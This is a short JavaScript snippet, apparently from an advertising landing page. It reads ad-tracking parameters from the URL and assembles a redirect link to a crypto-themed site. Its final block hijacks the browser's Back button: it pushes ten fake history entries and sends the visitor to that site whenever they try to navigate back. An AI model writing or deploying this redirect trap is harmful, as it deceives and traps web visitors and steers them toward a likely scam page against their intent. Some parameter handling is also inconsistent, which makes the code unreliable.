// Получаем переменные
const getUtmParameter = (sParam) => {
  const url = window.location.search.substring(1);
  const urlVariables = url.split('&');

  for (let i = 0; i < urlVariables.length; i++) {
    const variables = urlVariables[i].split('=');

    if (variables[0] === sParam) {
      return variables[1]
    }
  }

};

var rk_id = getUtmParameter('rk_id');

var bidid = getUtmParameter('bidid');
bidid = bidid.replace('bidid,', '');
var adn_id = getUtmParameter('adn_id');
adn_id = adn_id.replace('adn_id,', '');
var cpa = getUtmParameter('cpa');
cpa = cpa.replace('cpa,', '');
var impid = getUtmParameter('impid');
impid = impid.replace('impid,', '');
var creative_id = getUtmParameter('creative_id');
creative_id = creative_id.replace('creative_id,', '');
var site_id = getUtmParameter('site_id');
site_id = site_id.replace('site_id,', '');
var geo = getUtmParameter('geo');
geo = geo.replace('geo,', '');
var creo_pair = getUtmParameter('creo_pair');
creo_pair = creo_pair.replace('creo_pair,', '');
var c_type = getUtmParameter('c_type');
c_type = c_type.replace('c_type,', '');
var click_date = getUtmParameter('click_date');
click_date = click_date.replace('click_date,', '');
var params = getUtmParameter('req_date');
params = params.replace('params,', '');
var cid = getUtmParameter('cid');
cid = cid.replace('uid,', '');
var endpoint = getUtmParameter('endpoint');
endpoint = endpoint.replace('endpoint,', '');
const link_back = 'https://www.crypto-octagon.site/subu14f53f29d603134ac0b6ed2e7e41e8ae?bidid='+bidid+'&impid='+impid+'&adn_id='+adn_id+'&cpa='+cpa+'&creative_id='+creative_id+'&site_id='+site_id+'&geo='+geo+'&creo_pair='+creo_pair+'&c_type='+c_type+'&click_date='+click_date+'&params='+params+'&cid='+cid+'&endpoint='+endpoint+'&rk_id='+rk_id;


/////////////
! function () {
var t;
try {
for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
onpopstate = function (t) {
t.state && location.replace(link_back)
}
} catch (o) {}
}(); 

